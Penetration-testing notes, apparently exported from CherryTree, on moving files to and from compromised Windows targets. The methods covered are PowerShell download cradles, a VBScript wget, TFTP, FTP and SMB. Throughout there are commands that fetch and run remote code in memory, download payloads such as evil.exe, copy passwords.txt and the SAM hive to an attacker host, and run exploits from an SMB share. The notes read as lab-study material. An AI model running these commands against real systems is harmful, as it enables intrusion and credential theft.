<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Windows</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Transferring Files - Windows</h1></strong><br />Transferring files on and to Windows machines requires more effort in comparison to Linux.<br /><br /><strong><h2>## RDP</h2></strong><br />When RDP&#39;ing into a Windows machine, you can specify a file directory to share.<br /><div class="codebox"><div class="codebox">rdesktop&nbsp;10.10.10.10&nbsp;-u&nbsp;username&nbsp;-p&nbsp;password&nbsp;-r&nbsp;disk:linux=&#39;/tmp/rdp&#39;</div></div><br /><br />You can access the above shared file via <code>\\tsclient\linux\file.txt</code> <br />or just browse to it via My Computer. It&#39;s most likely the <code>Z:</code> drive.<br /><br />More info can be probably be found in the RDP sub-node.<br /><br /><strong><h2>## Download from Web Server</h2></strong><br />Upload the file you want to transfer onto a web host, or serve it from your attacking machine, and then download the file from your target Windows machine.<br /><br /><strong><h3>### Create Python Web Server</h3></strong><br />Start a web server on your attacking machine<br /><div class="codebox"><div class="codebox">mkdir&nbsp;serve;&nbsp;cd&nbsp;serve<br /><br />#&nbsp;For&nbsp;python2,&nbsp;use&nbsp;SimpleHTTPServer<br />python&nbsp;-m&nbsp;SimpleHTTPServer<br /><br />#&nbsp;For&nbsp;python3,&nbsp;use&nbsp;http.server<br />python3&nbsp;-m&nbsp;http.server</div></div><br /><br /><strong><h3>### Download file from CMD using PowerShell</h3></strong><br />Download a string and load it into memory &amp; execute<br /><div class="codebox"><div class="codebox">powershell&nbsp;&quot;IEX(New-Object&nbsp;Net.WebClient).downloadString(&#39;http://10.10.14.12/file.txt&#39;)&quot;</div></div><br /><br />Download file<br /><div class="codebox"><div class="codebox">powershell&nbsp;-c&nbsp;&quot;(New-Object&nbsp;Net.WebClient).downloadFile(&#39;http://10.9.122.8/binary.exe&#39;,&#39;C:\Users\bob\Desktop\binary.exe&#39;)&quot;</div></div><br /><br /><strong><h3>### Download file using PowerShell</h3></strong><br />Download a string and load it into memory &amp; execute<br /><div class="codebox"><div class="codebox">IEX(New-Object&nbsp;Net.WebClient).downloadString(&#39;http://10.10.14.12/file.txt&#39;)</div></div><br /><br />Download file<br /><div class="codebox"><div class="codebox">(New-Object&nbsp;Net.WebClient).downloadFile(&#39;http://10.10.14.12/binary.exe&#39;,&#39;C:\Users\bob\Desktop\binary.exe&#39;)</div></div><br /><br /><strong><h3>### Download file using Custom Script</h3></strong><br />If you were on Linux you could simply <code>wget</code> a file from a website.<br /><code>wget</code> doesn&#39;t exist on Windows, but you can write custom scripts that function like it.<br /><br /><strong>#### VBScript</strong><br />You can create a VBScript script that you can invoke from <code>cmd</code> to download a file served via HTTP.<br />This is only viable on Windows XP and Server 2003 (I don&#39;t know why. I don&#39;t think that&#39;s true).<br /><br />You can create the file by <code>echo</code>ing the lines of the wget script into a file.<br /><div class="codebox"><div class="codebox">echo&nbsp;strUrl&nbsp;=&nbsp;WScript.Arguments.Item(0)&nbsp;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;StrFile&nbsp;=&nbsp;WScript.Arguments.Item(1)&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;Const&nbsp;HTTPREQUEST_PROXYSETTING_DEFAULT&nbsp;=&nbsp;0&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;Const&nbsp;HTTPREQUEST_PROXYSETTING_PRECONFIG&nbsp;=&nbsp;0&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;Const&nbsp;HTTPREQUEST_PROXYSETTING_DIRECT&nbsp;=&nbsp;1&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;Const&nbsp;HTTPREQUEST_PROXYSETTING_PROXY&nbsp;=&nbsp;2&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;Dim&nbsp;http&nbsp;&nbsp;varByteArray&nbsp;&nbsp;strData&nbsp;&nbsp;strBuffer&nbsp;&nbsp;lngCounter&nbsp;&nbsp;fs&nbsp;&nbsp;ts&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;&nbsp;Err.Clear&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;&nbsp;Set&nbsp;http&nbsp;=&nbsp;Nothing&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;&nbsp;Set&nbsp;http&nbsp;=&nbsp;CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;)&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;&nbsp;If&nbsp;http&nbsp;Is&nbsp;Nothing&nbsp;Then&nbsp;Set&nbsp;http&nbsp;=&nbsp;CreateObject(&quot;WinHttp.WinHttpRequest&quot;)&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;&nbsp;If&nbsp;http&nbsp;Is&nbsp;Nothing&nbsp;Then&nbsp;Set&nbsp;http&nbsp;=&nbsp;CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;)&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;&nbsp;If&nbsp;http&nbsp;Is&nbsp;Nothing&nbsp;Then&nbsp;Set&nbsp;http&nbsp;=&nbsp;CreateObject(&quot;Microsoft.XMLHTTP&quot;)&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;&nbsp;http.Open&nbsp;&quot;GET&quot;&nbsp;&nbsp;strURL&nbsp;&nbsp;False&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;&nbsp;http.Send&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;&nbsp;varByteArray&nbsp;=&nbsp;http.ResponseBody&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;&nbsp;Set&nbsp;http&nbsp;=&nbsp;Nothing&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;&nbsp;Set&nbsp;fs&nbsp;=&nbsp;CreateObject(&quot;Scripting.FileSystemObject&quot;)&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;&nbsp;Set&nbsp;ts&nbsp;=&nbsp;fs.CreateTextFile(StrFile&nbsp;&nbsp;True)&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;&nbsp;strData&nbsp;=&nbsp;&quot;&quot;&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;&nbsp;strBuffer&nbsp;=&nbsp;&quot;&quot;&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;&nbsp;For&nbsp;lngCounter&nbsp;=&nbsp;0&nbsp;to&nbsp;UBound(varByteArray)&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;&nbsp;ts.Write&nbsp;Chr(255&nbsp;And&nbsp;Ascb(Midb(varByteArray&nbsp;lngCounter&nbsp;+&nbsp;1&nbsp;&nbsp;1)))&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;&nbsp;Next&nbsp;&gt;&gt;&nbsp;wget.vbs&nbsp;<br />echo&nbsp;&nbsp;ts.Close&nbsp;&gt;&gt;&nbsp;wget.vbs</div></div><br /><br /><code>wget.vbs</code> should script looks like this:<br /><div class="codebox"><div class="codebox">strUrl&nbsp;=&nbsp;WScript.Arguments.Item(0)<br />StrFile&nbsp;=&nbsp;WScript.Arguments.Item(1)<br />Const&nbsp;HTTPREQUEST_PROXYSETTING_DEFAULT&nbsp;=&nbsp;0<br />Const&nbsp;HTTPREQUEST_PROXYSETTING_PRECONFIG&nbsp;=&nbsp;0&nbsp;<br />Const&nbsp;HTTPREQUEST_PROXYSETTING_DIRECT&nbsp;=&nbsp;1&nbsp;<br />Const&nbsp;HTTPREQUEST_PROXYSETTING_PROXY&nbsp;=&nbsp;2<br />Dim&nbsp;http&nbsp;&nbsp;varByteArray&nbsp;&nbsp;strData&nbsp;&nbsp;strBuffer&nbsp;&nbsp;lngCounter&nbsp;&nbsp;fs&nbsp;&nbsp;ts&nbsp;<br />Err.Clear&nbsp;<br />Set&nbsp;http&nbsp;=&nbsp;Nothing&nbsp;<br />Set&nbsp;http&nbsp;=&nbsp;CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;)&nbsp;<br />If&nbsp;http&nbsp;Is&nbsp;Nothing&nbsp;Then&nbsp;Set&nbsp;http&nbsp;=&nbsp;CreateObject(&quot;WinHttp.WinHttpRequest&quot;)<br />If&nbsp;http&nbsp;Is&nbsp;Nothing&nbsp;Then&nbsp;Set&nbsp;http&nbsp;=&nbsp;CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;)&nbsp;<br />If&nbsp;http&nbsp;Is&nbsp;Nothing&nbsp;Then&nbsp;Set&nbsp;http&nbsp;=&nbsp;CreateObject(&quot;Microsoft.XMLHTTP&quot;)<br />http.Open&nbsp;&quot;GET&quot;&nbsp;&nbsp;strURL&nbsp;&nbsp;False&nbsp;<br />http.Send&nbsp;<br />varByteArray&nbsp;=&nbsp;http.ResponseBody&nbsp;<br />Set&nbsp;http&nbsp;=&nbsp;Nothing&nbsp;<br />Set&nbsp;fs&nbsp;=&nbsp;CreateObject(&quot;Scripting.FileSystemObject&quot;)&nbsp;<br />Set&nbsp;ts&nbsp;=&nbsp;fs.CreateTextFile(StrFile&nbsp;&nbsp;True)<br />strData&nbsp;=&nbsp;&quot;&quot;&nbsp;<br />strBuffer&nbsp;=&nbsp;&quot;&quot;&nbsp;<br />For&nbsp;lngCounter&nbsp;=&nbsp;0&nbsp;to&nbsp;UBound(varByteArray)&nbsp;<br />ts.Write&nbsp;Chr(255&nbsp;And&nbsp;Ascb(Midb(varByteArray&nbsp;lngCounter&nbsp;+&nbsp;1&nbsp;&nbsp;1)))<br />Next&nbsp;<br />ts.Close&nbsp;</div></div><br /><br />And then you can download the file using your script.<br /><div class="codebox"><div class="codebox">C:\Users\bob\Desktop&gt;cscript&nbsp;wget.vbs&nbsp;http://10.10.13.140/evil.exe&nbsp;evil.exe</div></div><br /><br /><strong><h2>## TFTP</h2></strong><br />TFTP is convenient, simple, and doesn&#39;t require authentication.<br />• Windows XP and 2003 contain a TFTP client by default.<br />• Windows 7 and Server 2008 and above require a TFTP client to be installed.<br /><br /><strong><h3>### Enable TFTP on Windows</h3></strong><br />You can enable TFTP from the command line:<br /><div class="codebox"><div class="codebox">pkgmgr&nbsp;/iu:&quot;TFTP&quot;</div></div><code><br /></code><br /><strong><h3>### Start TFTP server on Attacker</h3></strong><br /><div class="codebox"><div class="codebox">mkdir&nbsp;tftp<br />cd&nbsp;tftp<br />atftpd&nbsp;--daemon&nbsp;--port&nbsp;69&nbsp;tftp<br /><br />#&nbsp;Copy&nbsp;files&nbsp;you&nbsp;want&nbsp;to&nbsp;serve&nbsp;into&nbsp;the&nbsp;/tftp&nbsp;folder:<br />cp&nbsp;/usr/share/windows-binaries/nc.exe&nbsp;tftp</div></div><br />				<br /><strong><h3>### Use TFTP client on Windows</h3></strong><br /><div class="codebox"><div class="codebox">::&nbsp;Download<br />tftp&nbsp;-i&nbsp;192.168.10.5&nbsp;get&nbsp;nc.exe<br />::&nbsp;Upload<br />tftp&nbsp;-i&nbsp;192.168.10.5&nbsp;put&nbsp;passwords.txt</div></div><br /><br /><strong><h2>## FTP</h2></strong><br />Windows has a built in FTP client at <code>C:\Windows\System32\ftp.exe</code> <br />Because of this, FTP should almost always work.<br /><br />You should serve your files via an FTP server on your attacking machine.<br />• <code>vsftpd</code> - overkill for a quick FTP server. you just need to transfer files quickly<br />• <code>pytftpdlib</code> - a standard python library FTP server<br /><br /><strong><h3>### Create FTP Server on Attacker</h3></strong><br /><strong>#### pyftpdlib</strong><br /><div class="codebox"><div class="codebox">apt-get&nbsp;install&nbsp;python-pyftpdlib<br />python&nbsp;-m&nbsp;pyftpdlib&nbsp;-p&nbsp;21<br />python&nbsp;-m&nbsp;pyftpdlib&nbsp;-p&nbsp;21&nbsp;-w&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;-w&nbsp;allows&nbsp;anonymous&nbsp;access</div></div><br /><br /><strong><h3>### Download Files via FTP on Windows</h3></strong><br />Windows has an FTP client built in to the PATH.<br />Authenticate with user <code>anonymous</code> and any password.<br /><br /><strong>#### With an interactive shell</strong><br />The <code>ftp</code> command will drop you into an interactive session with the remote FTP server.<br />Therefore, to make full use of the <code>ftp</code> command you need to have an interactive shell on the system.<br /><br /><code>ftp 10.10.13.140</code><br /><br /><strong>#### With a non-interactive shell</strong><br />The Windows <code>ftp</code> command can take a &quot;script&quot; of commands directly from a text file.<br /><code>echo</code> the commands you want to run into a text file, and then tell <code>ftp</code> to run those commands:<br /><code>ftp -s:commands.txt</code><br /><br /><div class="codebox"><div class="codebox">::&nbsp;echo&nbsp;commands&nbsp;into&nbsp;.txt&nbsp;file<br />C:\Users\bob\Desktop&gt;echo&nbsp;open&nbsp;10.10.13.140&gt;ftp_commands.txt<br />C:\Users\bob\Desktop&gt;echo&nbsp;anonymous&gt;&gt;ftp_commands.txt<br />C:\Users\bob\Desktop&gt;echo&nbsp;anonpass&gt;&gt;ftp_commands.txt<br />C:\Users\bob\Desktop&gt;echo&nbsp;binary&gt;&gt;ftp_commands.txt<br />C:\Users\bob\Desktop&gt;echo&nbsp;get&nbsp;nc.exe&gt;&gt;ftp_commands.txt<br />C:\Users\bob\Desktop&gt;echo&nbsp;bye&gt;&gt;ftp_commands.txt<br /><br />::&nbsp;run&nbsp;commands&nbsp;in&nbsp;.txt&nbsp;file<br />C:\Users\bob\Desktop&gt;ftp&nbsp;-s:ftp_commands.txt</div></div><br /><br /><strong><h2>## SMB</h2></strong><br />SMB is a nice easy way of transferring files on Windows, but it&#39;s not particularly stealthy.<br /><br /><strong><h3>### Configure SMB Server on Linux</h3></strong><br />To download files via SMB you will need an SMB server to host your files on.<br />Setting up Samba on Linux can be a pain. Instead you can use Impacket&#39;s <code>smbserver.py</code> script.<br /><br /><strong>#### smbserver.py</strong><br /><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py</a><br /><br />1. Start SMB server on attacker<br /><div class="codebox"><div class="codebox">mkdir&nbsp;smb<br />python&nbsp;smbserver.py&nbsp;SHARENAME&nbsp;smb</div></div><br /><br />Newer Windows versions - <code>Server </code>2012, 10, etc. - might fail to connect to it:<br /><code>ConnectionResetError&#39; object is not subscriptable</code><br /><br />To solve this, try using <code>-smb2support</code><br /><div class="codebox"><div class="codebox">python&nbsp;smbserver.py&nbsp;-smb2support&nbsp;PWN&nbsp;.</div></div><br /><br /><strong><h3>### Download files via SMB</h3></strong><br />Before connecting, you can test that the SMB server is running<br /><div class="codebox"><div class="codebox">#&nbsp;from&nbsp;Linux<br />smbclient&nbsp;-L&nbsp;10.10.13.140&nbsp;--no-pass<br />#&nbsp;from&nbsp;Windows<br />net&nbsp;view&nbsp;\\10.10.13.140</div></div><br /><br />Windows will treat the SMB share as a directory, <br />meaning you can use all the basic Windows commands with it<br /><br /><div class="codebox"><div class="codebox">::&nbsp;list&nbsp;files&nbsp;in&nbsp;smb&nbsp;share<br />dir&nbsp;\\10.10.13.140\SHARENAME&nbsp;<br />::&nbsp;download&nbsp;file&nbsp;from&nbsp;target&nbsp;to&nbsp;current&nbsp;directory<br />copy&nbsp;\\10.10.13.140\SHARENAME\exploit.exe&nbsp;./&nbsp;<br />::&nbsp;upload&nbsp;file&nbsp;to&nbsp;smb&nbsp;server<br />copy&nbsp;%WINDIR%\repair\system&nbsp;\\10.11.0.42\HEYTHERE\system<br /></div></div><br /><br /><strong><h3>### Execute files via SMB</h3></strong><br />You can execute files straight from the share instead of downloading them if you&#39;d prefer.<br />This avoids dropping files to disk.<br /><br /><strong>#### via CMD</strong><br /><code>\\10.10.13.140\SHARENAME\exploit.exe</code><br /><br /><strong>#### via PowerShell</strong><br /><code>$args = &quot;/S&quot;, &quot;/qn&quot;</code><br /><code>Start-Process -FilePath &quot;\\10.10.13.140\SHARENAME\exploit.exe&quot; -ArgumentList $args</code><br /><br /><strong><h3>### SMB Bonus - Look at the NTLMv2 hashes</h3></strong><br />Look at the output from <code>smbserver.py</code> and you&#39;ll see the <code>NetNTLMv2</code> hash of the current Windows user every time we access the share. You can feed these into <code>John</code> or <code>Hashcat</code> and try crack them<br /><br /><strong><h2>## debug.exe</h2></strong><br />This is weird and obscure method of downloading files on 32bit systems.<br />The <code>debug.exe</code> executable can be used as an assembler, disassembler, and hex dumping tool.<br /><br /><strong>1) Convert nc.exe to nc.txt on kali machine</strong><br /><code>wine exe2bat.exe nc.exe nc.txt</code> - nc.txt will be a string of hex numbers<br /><br /><strong>2) Use echo commands to write out binary in hex (into a text file)</strong><br /><code>echo &lt;1st line of nc.txt&gt;</code> <br /><code>echo &lt;2nd line of nc.txt&gt;</code><br /><br /><strong>3) Use </strong><strong><code>debug.exe</code></strong><strong> to assemble the text file into a binary file</strong><br />Note that debug.exe has a 64k byte size limit to the files it can make<br />	<br /></div>
</body>
</html>
